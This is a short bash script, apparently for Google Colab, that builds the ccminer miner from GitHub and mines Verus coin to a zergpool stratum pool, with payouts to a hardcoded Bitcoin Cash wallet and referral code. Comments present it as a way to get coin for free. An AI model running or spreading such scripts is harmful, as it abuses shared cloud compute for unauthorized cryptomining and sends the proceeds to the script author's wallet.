#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh
./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u bitcoincash:qz7acnazzq8q9f2pdtnzajgaawnyu3zepyrrl6zapt -p c=BCH,mc=VRSC,refcode=154da8859865a8ef7d211c80356df4f0,ID=AndroBchMining -t 4
